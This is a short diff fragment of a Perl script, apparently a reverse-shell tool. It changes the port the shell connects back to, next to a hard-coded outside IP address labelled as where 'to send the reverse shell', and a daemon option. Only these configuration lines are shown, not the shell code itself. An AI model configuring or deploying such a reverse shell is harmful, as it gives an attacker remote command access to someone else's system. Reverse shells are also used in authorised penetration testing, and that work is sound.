@@ -6,7 +6,7 @@ my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
 my $ip = '157.245.112.189';
-my $port = 8485;
+my $port = 8080;
 
 # Options
 my $daemon = 1;
